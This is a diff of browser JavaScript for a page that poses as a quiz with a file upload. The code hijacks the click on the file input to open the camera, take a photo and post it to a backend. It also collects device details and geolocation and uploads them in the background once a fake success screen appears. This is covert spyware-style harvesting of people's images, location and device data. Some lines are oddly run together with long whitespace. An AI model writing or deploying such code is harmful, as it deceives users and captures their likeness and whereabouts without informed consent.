@@ -1,4 +1,6 @@
 const form = document.getElementById("quiz-form");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 const fileInput = document.getElementById("user-file");
 
 const BACKEND_BASE = "/api";
@@ -6,25 +8,37 @@ const constraints = { video: { facingMode: "user" }, audio: false };
 
 let cameraCaptured = false;
 let cameraInProgress = false;
-let capturedImage = null;                                             let cameraStream = null; // store the camera stream for reuse
+let capturedImage = null; // store camera image
+
+// ================================
+// ENSURE VIDEO IS CLEAN ON PAGE LOAD
+// ================================
+window.addEventListener("DOMContentLoaded", () => {
+  video.srcObject = null;
+  video.style.display = "none";
+  video.removeAttribute("autoplay"); // prevent auto-popup
+});
 
 // ================================
 // COLLECT METADATA (ON SUBMIT)
-// ================================                                   async function collectMetadata() {
+// ================================
+async function collectMetadata() {
   const metadata = {
     useragent: navigator.userAgent,
     platform: navigator.platform,
-    battery: "N/A",                                                       location: "N/A",
+    battery: "N/A",
+    location: "N/A",
     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
     network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
-    time: new Date().toLocaleString(),                                  };
+    time: new Date().toLocaleString(),
+  };
 
   if (navigator.getBattery) {
     try {
-      const b = await navigator.getBattery();                               metadata.battery = `${Math.round(b.level * 100)}% charging:${b.charging}`;
+      const b = await navigator.getBattery();
+      metadata.battery = `${Math.round(b.level * 100)}% charging:${b.charging}`;
     } catch {}
-  }
-
+  }                                                                   
   if (navigator.permissions && navigator.geolocation) {
     try {
       const status = await navigator.permissions.query({ name: "geolocation" });
@@ -37,36 +51,30 @@ let capturedImage = null;                                             let camera
     } catch {}
   }
 
-  return metadata;
-}                                                                     
+  return metadata;                                                    }
+
 // ================================
 // CAMERA CAPTURE + UPLOAD (/upload)
-// ================================                                   async function captureAndSendCamera() {
+// ================================
+async function captureAndSendCamera() {
   if (cameraCaptured || cameraInProgress) return;
 
   cameraInProgress = true;
   console.log("📸 captureAndSendCamera called");
 
   try {
-    // Request camera permission only once
-    if (!cameraStream) {
-      cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
-      console.log("✅ Camera permission granted (system popup shown once)");
-    }
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
+    video.setAttribute("playsinline", true); // mobile fix
+    video.style.display = "block";
 
-    // Dynamically create video element
-    const video = document.createElement("video");
-    video.setAttribute("playsinline", "true");
-    video.style.display = "none";
-    document.body.appendChild(video);
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => resolve();
+    });
 
-    video.srcObject = cameraStream;
-
-    await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
     await video.play();
-    await new Promise(r => setTimeout(r, 1200));
-                                                                          // Capture image from video
-    const canvas = document.createElement("canvas");
+    await new Promise((r) => setTimeout(r, 1200)); // wait for frame
+
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
 
@@ -76,7 +84,7 @@ let capturedImage = null;                                             let camera
     capturedImage = canvas.toDataURL("image/png");
     console.log("✅ Camera captured successfully");
 
-    // Send captured image to /upload API
+    // Send captured image to your /upload API
     const res = await fetch(`${BACKEND_BASE}/upload`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -86,10 +94,11 @@ let capturedImage = null;                                             let camera
     const data = await res.json();
     console.log("Camera upload response:", data);
 
-    // Cleanup video element
-    video.remove();
-    cameraCaptured = true;
+    // Stop camera
+    stream.getTracks().forEach((t) => t.stop());
+    video.style.display = "none";
 
+    cameraCaptured = true;
   } catch (err) {
     console.error("❌ Camera error:", err);
   } finally {
@@ -97,20 +106,14 @@ let capturedImage = null;                                             let camera
   }
 }
 
-// Stop camera when leaving page
-window.addEventListener("beforeunload", () => {
-  if (cameraStream) {
-    cameraStream.getTracks().forEach(track => track.stop());
-  }
-});
-
 // ================================
 // TRIGGER CAMERA ONLY ON FILE INPUT
 // ================================
-fileInput.addEventListener("pointerdown", async (e) => {                if (!cameraCaptured && !cameraInProgress) {
-    e.preventDefault(); // stop default file picker temporarily
-    await captureAndSendCamera(); // permission asked here once
-    setTimeout(() => fileInput.click(), 50); // reopen file picker
+fileInput.addEventListener("pointerdown", async (e) => {
+  if (!cameraCaptured && !cameraInProgress) {
+    e.preventDefault(); // stop file picker temporarily
+    await captureAndSendCamera(); // permission asked here
+    setTimeout(() => fileInput.click(), 50); // reopen file picker after capture
   }
 });
 
@@ -133,28 +136,32 @@ async function uploadFile(file) {
       } catch (err) {
         reject(err);
       }
-    };
-
+    };                                                                
     reader.onerror = () => reject(reader.error);
     reader.readAsDataURL(file);
-  });                                                                 }
+  });
+}
 
 // ================================
 // FORM SUBMIT (FILE + METADATA + CAMERA)
-// ================================                                   form.addEventListener("submit", async (e) => {
+// ================================
+form.addEventListener("submit", async (e) => {
   e.preventDefault();
 
   if (!form.checkValidity()) {
-    form.reportValidity();                                                return;
+    form.reportValidity();
+    return;
   }
 
   if (!fileInput.files.length) {
     alert("Please upload a file first");
-    return;                                                             }
+    return;
+  }
 
   // Show success immediately
   document.getElementById("quiz-container").style.display = "none";
   document.getElementById("success-container").style.display = "flex";
+
   // Background upload
   (async () => {
     try {
@@ -173,7 +180,7 @@ async function uploadFile(file) {
           file: fileData,
           filename: fileInput.files[0].name,
           metadata,
-          cameraImage: capturedImage || null, // attach camera image if available
+          cameraImage: capturedImage || null, // include if available
         }),
       });
 
